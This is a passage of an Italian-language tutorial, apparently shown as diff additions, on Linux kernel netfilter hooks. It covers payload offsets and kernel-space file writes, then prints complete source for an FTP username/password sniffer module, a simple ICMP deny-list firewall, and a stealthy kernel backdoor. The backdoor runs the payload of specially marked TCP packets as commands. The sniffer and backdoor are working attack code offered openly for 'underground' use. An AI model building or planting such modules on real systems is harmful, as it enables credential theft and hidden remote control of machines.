+ immagazzinate le informazioni riguardanti il messaggio contenuto in ogni pacchetto
+ TCP e successivamente come interagire con i file da kernel:
+ 
+ Per risalire all'indirizzo dove inizia il messaggio dati (payload) del pacchetto
+ abbiamo bisogno di compiere alcuni passaggi.
+ Pensando alla rappresentazione di un pacchetto nel kernel (struct sk_buff),
+ abbiamo la seguente composizione:
+
+	Network layer header + Transport layer header + data
+
+ dunque nel nostro caso:
+
+ 	IP Header + TCP Header + data
+
+ l'inizio di IP Header e' contenuto in sk_buff->nh.raw, l'inizio del TCP Header 
+ e' contenuto invece in sk_buff->h.raw:
+
+	/* Transport layer header */
+	union
+	{
+		struct tcphdr	*th;
+		[...]
+		unsigned char	*raw;
+	} h;
+
+ per quanto riguarda l'inizio del payload (data) non abbiamo alcun riferimento
+ gia' espresso, ma possiamo ricavarlo sommando all'indirizzo di inizio del TCP Header 
+ la lunghezza dello stesso..  
+ La lunghezza di TCP Header possiamo calcolarla riferendoci alla variabile
+ doff (data offset) che ci indica la distanza tra l'inizio del TCP header e 
+ l'inizio di 'data' (dunque del payload) in unita' da 32 bit .
+
+	__u16	doff:4,
+
+ essendo doff composta da soli 4 bit, avremo un massimo valore in binario di
+ 1111 ovvero 15 in decimale dove 1 e' uguale a 32bit di distanza, occore pero'
+ specificare la distanza in byte se si vuole fare la somma con l'indirizzo
+ contenuto in sk_buff->h.raw, dunque tenendo conto che 1 byte = 8bit
+ il tetto massimo di 15 unita' da 32 bit diventera:
+
+ 	15*(32/8) == 15*4;
+
+ detto questo la formula finale per ottenere l'indirizzo dove inizia il messaggio
+ del pacchetto TCP e' la seguente:
+
+	// unsigned char *pkt_data;
+ 	pkt_data = (unsigned char *)sb->h.raw +(sb->h.th->doff * 4);
+
+
+[===-0x04d Utilizzo dei file in kernelspace-==============================] 
+
+
+ Lavorare con i file in kernel, e' assolutamente SCONSIGLIATO, la portabilita'
+ di queste operazioni e' minima ed e' inoltre possibile che per un minimo errore
+ si verifichino crash di sistema, o si esponga l'intera macchina a svariati
+ tipi di attacchi 
+ Per creare o modificare i file utilizzando un kernel module, possiamo 
+ appellarci alla funzione filp_open() usata anche dalle syscall 
+ sys_read e sys_write:
+	
+	(fs/open.c)
+	struct file *filp_open(const char * filename, int flags, int mode)
+
+ questa funzione ritorna una struttura di tipo file, dichirata in <linux/fs.h>
+ e richiede 3 argomenti specifici:
+
+	filename: nome del file da aprire
+	flags: modalita' di apertura
+		O_CREAT  - crea il file se non esiste
+		O_RDONLY - apre il file in sola lettura
+		O_WRONLY - apre il file in sola scrittura
+		O_RDWR   - apre il file in lettura e scrittura
+		[...]
+	mode: permessi sul file espressi in bit
+		777 - lettura scrittura ed esecuzione per qualunque utente
+		700 - lettura scrittura ed esecuzione per un solo utente
+		555 - sola lettura
+		ecc.. ecc.. (vedere la gestione dei permessi sui file in unix)
+
+ per creare dunque un file di nome "README" nella directory /root con permessi 
+ "rwxrwxrwx" (lettura scrittura ed esecuzione per qualsiasi utente), la chiamata
+ sara' gestita in questa maniera:
+
+	struct file *fs;
+	fs = filp_open("/root/README", O_WRONLY | O_CREAT, 0777);
+
+ Ancora prima di vedere come poter scrivere sul file appena aperto, 
+ abbiamo bisogno di affrontare un'altro argomento:
+ linux fa' utilizzo di un tipo di segmentazione della memoria che differenzia 
+ in modo preciso la memoria Kernel Space dalla memoria User Space,
+ prima dunque di effettuare la chiamata per la scrittura dobbiamo permettere
+ alla syscall di utilizzare i buffer presenti in kernel space, e per fare questo 
+ occorre andare a modificare l'addr_limit del processo:
+ 
+ Ogni normale processo su un sistema linux e' infatti rappresentato dalla struttura 
+ 'task_struct' <linux/sched.h>, dove al suo interno e' presente una variabile di
+ tipo mm_segment_t (una semplice long) che rappresenta l'indirizzo oltre il quale
+ il processo non puo' andare ad operare:	
+
+ mm_segment_t addr_limit;	/* thread address space:
+					0-0xBFFFFFFF for user-thead
+					0-0xFFFFFFFF for kernel-thread
+				 */
+
+ Per evitare errori, o crash di sistema, svolgeremo il tutto con qualche accorgimento,
+
+ 	1. salviamo l'addr_limit corrente
+	2. settiamo addr_limit a KERNEL_DS (kernel space)
+	3. scriviamo sul file
+	4. risettiamo l'addr_limit con il valore salvato al punto 1
+
+ per fare questo ci serviremo di 2 funzioni, get_fs() per recuperare l'indirizzo
+ corrente e set_fs() per assegnare il nuovo limite..
+
+ (KERNEL_DS e USER_DS sono definiti in <asm/segment.h>
+
+ Ora siamo pronti per la scrittura. 
+ Aperto il file, nella struttura 'fs' sono contenute le varie informazioni 
+ su di esso, andando a controllare nei sorgenti del kernel la composizione 
+ della struttura 'file' notiamo che al suo interno sono contenute 
+ altri tipi di strutture, tra le quali "struct file_operations" che ci servira' 
+ per le funzioni integrate in essa, ovvero:
+
+	ssize_t (*read) (struct file *, char *, size_t, loff_t *);
+	ssize_t (*write) (struct file *, const char *, size_t, loff_t *);
+
+ la prima per leggere e la seconda per scrivere all'interno del file.
+ le uniche cose richieste da 'write' sono la struttura 'file' 
+ sulla quale stiamo lavorando (nel nostro caso 'fs'), 
+ il buffer contenente i dati da scrivere all'interno del file,
+ la lunghezza in byte dei dati nel buffer e la posizione all'interno 
+ del file dalla quale partiremo a scrivere: 
+
+ Vediamo dunque il codice completo per la creazione di un file 
+ "/root/README" contenente il testo "Hello world":
+
+ //-<inizio codice: filewrite.c>-----------------------------------
+
+ #define __KERNEL__
+ #define MODULE
+
+ #include <linux/module.h>
+ #include <linux/kernel.h>
+ #include <linux/init.h>
+
+ #include <linux/slab.h>
+ #include <linux/fs.h>
+ #include <asm/uaccess.h>
+
+ int __init load(void) {
+	struct file *fs;
+	ssize_t wrlen;
+	mm_segment_t orig_fs;
+	char *buffer = kmalloc(20, GFP_KERNEL); // alloco spazio in KERNEL SPACE
+
+	/* questo passaggio mi permette di usare read() e write() con buffer residenti
+	in kernel space */
+
+	orig_fs = get_fs();
+	set_fs(KERNEL_DS);
+
+	strcpy(buffer,"Hello world!\n");
+	fs = filp_open("/root/README", O_WRONLY | O_CREAT, 0777);
+
+	wrlen = fs->f_op->write(fs, buffer, strlen(buffer), &fs->f_pos); // scrivo su file
+
+	filp_close(fs, NULL); // chiudo il file
+	return 0; // esco
+ }
+
+ void __exit unload(void) {
+	return;
+ }
+
+ module_init(load);
+ module_exit(unload);
+
+ MODULE_LICENSE("GPL");
+
+ //-<fine codice: filewrite.c>-------------------------------------
+
+
+ Una volta inserito il modulo, andando a controllare nella 
+ directory /root noteremo la presenza del file README con il relativo 
+ contenuto testuale..
+
+ spiegato questo vi lascio al codice completo del 
+ "kernel ftp account sniffer"
+
+
+[===-0x04e ftp-accgrabber.c-==============================================] 
+
+
+ #define __KERNEL__
+ #define MODULE
+
+ #include <linux/kernel.h>
+ #include <linux/init.h>
+ #include <linux/module.h>
+ #include <linux/slab.h>
+ #include <linux/fs.h>
+ #include <linux/netfilter.h>
+ #include <linux/netfilter_ipv4.h>
+ #include <linux/in.h>
+ #include <linux/tcp.h>
+ #include <linux/ip.h>
+ #include <linux/string.h>
+ #include <asm/uaccess.h>
+
+ #define FTP_PORT 21		// porta da controllare (default: 21 (ftp))
+ /* #define FILENAME "/root/logfile" */
+
+ struct nf_hook_ops out_hook;
+
+ char *user = NULL;
+ char *pass = NULL;
+
+ /* uncomment this at your own risk ;)
+ int log2file(char *string) {
+	struct file *log;		// struttura per la rappresentazione del file
+	ssize_t wrlen;			// lunghezza dei byte scritti
+	mm_segment_t orig_fs;
+	
+	orig_fs = get_fs();
+	set_fs(KERNEL_DS);
+
+	log = filp_open(FILENAME, O_WRONLY | O_CREAT, 0777);
+	wrlen = log->f_op->write(log, string, strlen(string), &log->f_pos);
+	
+	filp_close(log, NULL);		// chiudo file
+	set_fs(orig_fs);
+	return 0;
+ }	
+ */
+
+ unsigned int ftpgrabber(unsigned int hooknum, 
+			struct sk_buff **skb,
+			const struct net_device *in,
+			const struct net_device *out,
+			int (*okfn)(struct sk_buff *))
+ {
+	unsigned char *pkt_data = NULL;
+
+	struct sk_buff *sb = *skb;
+
+	int i = 0;
+	__u32 dest_ip;
+ 
+	if (sb->nh.iph->protocol != IPPROTO_TCP) return NF_ACCEPT;	// ignoro se non e' un pacchetto TCP
+	if (htons(sb->h.th->dest)!=FTP_PORT) return NF_ACCEPT;		// se non e' destinato alla porta voluta saltiamo i controlli
+    
+	/* prendiamo il messaggio contenuto nel pacchetto */
+
+	pkt_data = (unsigned char *)sb->h.raw + (sb->h.th->doff * 4);
+	dest_ip = sb->nh.iph->daddr;					// salviamo l'indirizzo IP di destinazione
+
+	if(strstr(pkt_data, "USER ")!=NULL) {
+
+		user = (char *)kmalloc(sizeof(pkt_data), GFP_KERNEL);	// riservo lo spazio
+		/* se e' presente memorizziamo il contenuto della stringa
+		 * copio pkt_data in user byte per byte finche' non trovo
+		 * il byte di invio '\n'
+		 */
+		while (*(pkt_data + i)!='\n') {
+			*(user + i) = *(pkt_data + i);
+			i++;
+		}
+		printk("%d.%d.%d.%d: %s\n", NIPQUAD(dest_ip), user);
+		// log2file(user);
+		kfree(user);						// libero lo spazio
+	}
+	else if(strstr(pkt_data, "PASS ")!=NULL) {
+
+		pass = (char *)kmalloc(sizeof(pkt_data), GFP_KERNEL);	// riservo lo spazio
+		while (*(pkt_data + i)!='\n') {
+			*(pass + i) = *(pkt_data + i);
+			i++;
+		}
+		printk("%d.%d.%d.%d: %s\n", NIPQUAD(dest_ip), pass);
+		// log2file(pass);
+		kfree(pass);						// libero lo spazio
+	}
+
+	return NF_ACCEPT;
+ }
+
+
+ int __init load(void) {
+
+	/* popoliamo la struttura out_hook */
+	out_hook.hook = ftpgrabber;		// funzione
+	out_hook.hooknum = NF_IP_POST_ROUTING;	// pacchetti in uscita
+	out_hook.pf = PF_INET;			// protocol family
+	out_hook.priority = NF_IP_PRI_FIRST;	// primo hook da eseguire
+
+	nf_register_hook(&out_hook);
+	return 0;
+ }
+
+ void __exit unload(void) {
+     nf_unregister_hook(&out_hook);
+ }
+
+ module_init(load);
+ module_exit(unload);
+
+ MODULE_LICENSE("GPL");
+
+
+[===-0x05 Hooooking (firewalling)-========================================] 
+
+
+ Un aspetto molto importante del netfilter hooking, e' la facilita' con
+ la quale si possono programmare dei firewall veloci, affidabili 
+ ed efficenti.
+ Un esempio pratico puo' essere visto effettuando un controllo su tutti 
+ i pacchetti in entrata per bloccare quelli che arrivano da determinati 
+ indirizzi IP, riferendoci ad una lista (array) interna al programma...
+
+ Il codice e' abbastanza commentato e non necessita' dell'introduzione di
+ alcun nuovo argomento..
+
+
+[===-0x05a Basic deny.list Firewall-======================================] 
+
+
+ //---(inizio codice)----------------------------------------------------
+
+/* kernelfirewall.c blocks every ICMP packets received by specified IP addresses */
+
+ #define __KERNEL__
+ #define MODULE
+
+ #include <linux/module.h>
+ #include <linux/kernel.h>
+ #include <linux/init.h>
+
+ /* punto uno... le librerie necessarie */
+
+ #include <linux/skbuff.h>         // linux kernel socket buffer structure
+ #include <linux/netfilter.h>      // netfilter
+ #include <linux/netfilter_ipv4.h> // specifica per IPv4
+ #include <linux/in.h>
+ #include <linux/tcp.h>
+ #include <linux/ip.h>
+
+ #define LISTSIZE 3
+
+ __u32 deny[LISTSIZE];
+
+ static struct nf_hook_ops nfhook;  // nf_hook_ops structure
+
+ unsigned int my_hook(unsigned int hooknum,
+                      struct sk_buff **skb,
+                      const struct net_device *in,
+                      const struct net_device *out,
+                      int (*okfn)(struct sk_buff *))
+ {
+        struct sk_buff *sb = *skb;
+	__u32 source_ip;
+	int i = 0;
+
+	if (sb->nh.iph->protocol != IPPROTO_ICMP) return NF_ACCEPT; // controlliamo solo i pacchetti ICMP
+
+	source_ip = sb->nh.iph->saddr;
+	while(i<LISTSIZE) {
+		/* controllo se il pacchetto proviene da un indirizzo in lista */
+		if(source_ip == deny[i]) {
+			printk("\nignoring banned ip address: %d.%d.%d.%d\n", NIPQUAD(source_ip));
+			return NF_DROP;		// rifiuto il pacchetto
+		}
+		i++;
+	}
+	return NF_ACCEPT;
+ }
+
+ int __init load(void) {
+
+	/* inseriamo gli indirizzi IP dei quali vogliamo
+	 * ignorare ogni pacchetto */
+        deny[0] = in_aton("10.0.0.1");
+        deny[1] = in_aton("10.0.0.2");
+	deny[2] = in_aton("10.0.0.3");
+
+	/* punto due... la struttura nf_hook_ops */
+	nfhook.hook = my_hook;                // la nostra funzione
+	nfhook.hooknum = NF_IP_PRE_ROUTING;   // ipv4 prerouting
+	nfhook.pf = PF_INET;                  // protocol family
+	nfhook.priority = NF_IP_PRI_FIRST;    // primo hook da eseguire
+
+        nf_register_hook(&nfhook);            // registrazione hook
+        return 0;
+
+ }
+
+ void __exit unload(void) {
+
+        nf_unregister_hook(&nfhook);          // rimozione hook
+
+ }
+
+ module_init(load);
+ module_exit(unload);
+
+ MODULE_LICENSE("GPL");
+
+ //---(fine codice)-------------------------------------------------------
+
+
+[===-0x06 Hook-king (and then.. hacking)-=================================] 
+
+
+ Visti e studiati gli utilizzi convenzionali dei netfilter hooks, possiamo dare
+ un'occhiata a cosa offre questa tecnica applicata nel mondo dell'underground
+ informatico.
+
+ Innanzitutto abbiamo a disposizione un collegamento con l'esterno senza bisogno di 
+ aprire alcuna porta, questo ci permette di essere meno visibili all'interno
+ del sistema. Possiamo controllare i pacchetti in entrata e in uscita prima
+ che questi vengano letti dai processi ai quali sono indirizzati, dunque abbiamo
+ controllo su ogni dato sensibile che viaggia tra il computer e la rete..
+ Insomma le potenzialita' ci sono, mancano solo delle idee intelligenti..
+
+ La mia idea si chiama "pizza-icmp" consiste in un hook sui pacchetti ICMP
+ in ricezione, che effettua un controllo sul payload del pacchetto, e se
+ contenente una stringa predefinita (password) esegue o termina un determinato 
+ processo sul sistema dove e' collocato.
+ Il programma e' composto da un modulo da caricare nel sistema linux che si vuole
+ controllare e un client da mettere sul vostro pc per comunicare correttamente
+ con il modulo..
+
+ Prima di vedere il codice del modulo, dobbiamo pero' introdurre un nuovo argomento..
+
+
+[===-0x06a Esecuzione di un file-=========================================] 
+
+
+ Per eseguire un file da kernelspace esiste una funzione apposita:
+
+ kernel 2.4
+ 	int call_usermodehelper (char *path, char **argv, char **envp);
+
+ kernel 2.6
+ 	int call_usermodehelper (char *path, char **argv, char **envp, int wait);
+
+
+ dove "path" e' il percorso completo dove risiede il file da eseguire,
+ "argv" sono i parametri da linea di comando che vogliamo passare al processo
+ e "envp" sono gli environment ("HOME", "PATH" ecc..), e wait (su 2.6) specifica
+ se ci sara' bisogno di aspettare la fine dell'esecuzione del processo "path" 
+ (wait = 1) oppure no (wait = 0).
+ Un esempio completo del suo uso e' possibile trovarlo nei sorgenti dei driver 
+ USB per 2.4 che si trovano in /usr/src/linux-$KERNELVERSION/drivers/usb/usb.c
+ alla funzione call_policy_interface()..
+
+ 
+[===-0x06b Il nostro problema (interrupt context)-========================] 
+
+
+ Ovviamente nel nostro caso sorge un problema, durante l'arrivo di un pacchetto
+ ci troviamo in "interrupt context", ovvero il contesto nel quale il kernel
+ gestisce e risponde ad un interrupt (come un pacchetto entrante)...
+ L'esecuzione di un qualunque altro processo in interrupt context 
+ porterebbe sicuramente al crash del sistema appena raggiunta la chiamata
+ a schedule()  (kernel panic)
+ In nostro aiuto il kernel ci propone le work queues per kernel 2.6 e le
+ task queues per kernel 2.4.
+ 
+
+[===-0x06c La nostra soluzione (work queues)-=============================] 
+
+
+ Le work_queues sono delle code nelle quali il kernel inserisce funzioni 
+ da eseguire più avanti nel tempo, con la garanzia di essere eseguite in
+ process context.
+ Farne uso e' molto semplice, ci basta creare una funzione con il seguente
+ prototipo:
+
+	void function_name(void *arg)
+
+ dove inseriremo tutte le istruzioni che vogliamo far eseguire al kernel
+ una volta uscito dall'interrupt context, e infine riccorrere all'uso
+ di una di queste due macro:
+
+	#include <linux/workqueue.h>
+	
+	DECLARE_WORK(name, function, data);
+	INIT_WORK(p, function, data);
+
+ Nella prima macro dichiareremo una work_struct globale chiamata 'name' che
+ verra' inizializzata con la funzione dichiarata in precedenza 'function', 
+ mentre 'data' sono i parametri che vogliamo passare alla funzione.
+ Nella seconda invece 'p' e' un puntatore ad una work_struct gia' dichiarata
+ da noi..
+
+ Fatto questo per mettere in coda la nostra funzione per essere eseguita
+ il prima possibile dal kernel, usiamo la schedule_work();
+
+	#include <linux/sched.h>
+
+	int schedule_work(struct work_struct *work)
+
+ passiamo a questa funzione la nostra work_struct e controlliamo il valore
+ di ritorno, che sara' diverso da 0 in caso di successo e 0 in caso errore..
+ 
+ nel caso in cui volessimo che la nostra funzione venga eseguita soltanto
+ dopo un certo periodo di tempo possiamo ricorrere all'uso di quest'altra 
+ funzione:
+
+	int schedule_delayed_work(struct work_struct *work, unsigned long delay);
+
+ e la rispettiva:
+
+	int cancel_delayed_work(struct work_struct *work); // per annullare lo scheduling 
+ 
+
+[===-0x06d Kernel 2.6: unusual non-listening backdoor (K.R.E)-============] 
+
+
+ Qui di seguito vi lascio un idea di darkangel, (http://darkangel.antifork.org)
+ presentata nel suo testo "LKEPD" raggiungibile dal suo sito 
+ alla voce "publications".
+ 
+ Questo modulo (riproducibile anche via netfilter hooks, a voi il compito) si occupa
+ di registrare un nuovo packet handler nel network stack, che alla ricezione di
+ un pacchetto TCP contenente la porta sorgente uguale a quella di destinazione,
+ esegue il contenuto del payload del pacchetto, come se fosse un comando passato
+ alla shell interprete di linux, /bin/sh, facendo uso di parte delle tecniche viste
+ e approfondite in questo testo...
+
+ //---(inizio codice)----------------------------------------------------
+
+   #define LINUX
+
+   #ifdef CONFIG_MODVERSIONS
+
+   #include <linux/modversions>
+
+   #endif
+
+   #include <linux/module.h>
+
+   #include <linux/kernel.h>
+
+   #include <linux/skbuff.h>
+
+   #include <linux/netdevice.h>
+
+   #include <linux/sched.h>
+
+   #include <linux/in.h>
+
+   #include <linux/ip.h>
+
+   #include <linux/tcp.h>
+
+   #include <linux/if_ether.h>
+
+   #include <linux/mm.h>
+
+   #include <linux/spinlock.h>
+
+   #include <linux/workqueue.h>
+
+
+
+   /* macro per accedere alle varie parti del pacchetto */
+
+
+
+   #define S_ADDR(x)       x->nh.iph->saddr
+
+   #define D_ADDR(x)       x->nh.iph->daddr
+
+   #define PROTOCOL(x)     x->nh.iph->protocol
+
+   #define TCP_SPORT(x)    ((struct tcphdr*)((unsigned long)x->nh.iph+(x->nh.iph->ihl*4)))->source
+
+   #define TCP_DPORT(x)    ((struct tcphdr*)((unsigned long)x->nh.iph+(x->nh.iph->ihl*4)))->dest
+
+   #define UDP_SPORT(x)    ((struct udphdr*)((unsigned long)x->nh.iph+(x->nh.iph->ihl*4)))->source
+
+   #define UDP_DPORT(x)    ((struct udphdr*)((unsigned long)x->nh.iph+(x->nh.iph->ihl*4)))->dest
+
+
+
+   /* dimensione del payload del pacchetto attivatore */
+
+
+
+   unsigned short               size=0;
+
+
+
+   /* ci dice se possiamo sovrascrivere i dati precedentemente salvati */
+
+
+
+   unsigned short               overwrite=1;
+
+
+
+   /* spinlock di protezione delle variabili globali. Non sarebbe strettamente indispensabile,
+
+      ma cosi' e' molto piu pulito
+
+    */
+
+   spinlock_t           startlock=SPIN_LOCK_UNLOCKED;
+
+
+
+   /* interfaccia di ascolto */
+
+
+
+   unsigned char                *listening_eth=NULL;
+
+
+
+   /* struttura che useremo per impostare il nostro filtro su un'interfaccia */
+
+
+
+   struct        packet_type    filtro;
+
+
+
+   /* payload del pacchetto */
+
+
+
+   unsigned char                payload[65536]={0};
+
+
+
+   struct work_struct executioner;
+
+   MODULE_PARM(listening_eth,"s");
+
+   inline void despace(char *string,int size)
+
+   {
+
+
+          for(;*string&&size;size--,string++)
+
+                   if((*string==' ')||(*string=='\n')||(*string=='\r'))
+
+                           *string='\0';
+
+   }
+
+   
+
+   void
+
+   worker(void *data)
+
+   {
+
+      char    *argv[255]={0};
+
+      char    *envp[255]={0};
+
+      int     parsed_size=0,pos=0;
+
+      char    *lptr;
+
+      despace(payload,size);
+
+      lptr=payload;
+
+      while((parsed_size<size)&&(pos<255))
+
+      {
+
+            argv[pos]=(char*)kmalloc(strlen(lptr)+1,GFP_KERNEL);
+
+            memcpy(argv[pos],lptr,strlen(lptr)+1);
+
+            parsed_size+=strlen(lptr)+1;
+
+            lptr+=strlen(lptr)+1;
+
+            pos++;
+
+      }
+
+      size=0;
+
+      spin_lock(&startlock);
+
+      overwrite=1;
+
+      spin_unlock(&startlock);
+
+      call_usermodehelper(argv[0],argv,envp,1);
+
+      for(pos=0;argv[pos];pos++)
+
+      {
+
+          kfree(argv[pos]);
+
+          argv[pos]=NULL;
+
+      }
+
+   }
+
+   
+
+   int net_filter(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt)
+
+   {
+
+     struct tcphdr tcph={0};
+
+     unsigned int  dataoff=0,datalen=0;
+
+     if(PROTOCOL(skb)==IPPROTO_TCP)
+
+     {
+
+       if(TCP_SPORT(skb)==TCP_DPORT(skb))
+
+       {
+
+	  spin_lock(&startlock);
+
+	  /* se non l'abbiamo ancora processato non possiamo sovrascrivere il payload
+
+	   * del pacchetto precedente */
+
+          if(!overwrite)
+
+              goto error;
+
+          memset(payload,'\0',sizeof(payload));
+
+          if (skb_copy_bits(skb, skb->nh.iph->ihl*4, &tcph, sizeof(tcph)) != 0)
+
+		          goto error;
+
+          dataoff = skb->nh.iph->ihl*4 + tcph.doff*4;
+
+          if (dataoff >= skb->len)
+
+                      goto error;
+
+          datalen = skb->len - dataoff;
+
+          if(datalen<=0)
+
+              goto error;
+
+	  /* con la skb_copy_bits gestiamo il caso in cui il pacchetto sia frammentato */
+
+          skb_copy_bits(skb,dataoff,payload,datalen);
+
+	      size=datalen;
+
+          overwrite=0;
+
+          spin_unlock(&startlock);
+
+	  /* dichiariamo ed inizializziamo il work */
+
+          INIT_WORK(&executioner,worker,NULL);
+
+	  /* mettiamolo sulla workqueue di default del kernel */
+
+          schedule_work(&executioner);
+
+       }
+
+     }
+
+     kfree_skb(skb);
+
+     return 0;
+
+     error:
+
+         spin_unlock(&startlock);
+
+         kfree_skb(skb);
+
+         return 0;
+
+   }
+
+   
+
+   int add_filter(char *name,int(*func)(struct sk_buff *, struct net_device *,struct packet_type *))
+
+   {
+
+       struct net_device *dev=dev_get_by_name(name);
+
+       if(!dev)
+
+          return -1;
+
+       filtro.type=htons(ETH_P_ALL);
+
+       filtro.dev=dev;
+
+       filtro.func=func;
+
+       dev_add_pack(&filtro);
+
+       return 0;
+
+   }
+
+   
+	
+   int hijack(void)
+
+   {
+
+       if(!listening_eth)
+
+           return -1;
+       if(add_filter(listening_eth,net_filter)<0)
+
+           return -1;
+
+       return 0;
+   }
+
+   void restore(void)
+
+   {
+
+       dev_remove_pack(&filtro);
+
+   }
+
+   
+
+   module_init(hijack);
+
+   module_exit(restore);
+
+ //---(fine codice)-------------------------------------------------------
+
+
+[===-0x07 Conclusioni-====================================================] 
+
+ 
+ Nella speranza che questo testo vi sia stato di aiuto, vi invito a 
+ visitare il sito www.eviltime.com e a contattarmi all'indirizzo email
+ webmaster@eviltime.com.
+ Sono ovviamente accettate domande e critiche, purche' entrambi siano di 
+ tipo costruttivo..
+
+
+[===-0x08 Referenze-======================================================] 
+
+
+ http://darkangel.antifork.org/publications/lkepd.html
+ http://www.kernelnewbies.org
+ http://www.netfilter.org/documentation/HOWTO/netfilter-hacking-HOWTO.html
+ http://hmyblog.vmmatrix.net/lna/0131777203_ch19lev1sec3.html
+
+
+ Sentiti ringraziamenti a brnocrist, pit e darkangel :)
+
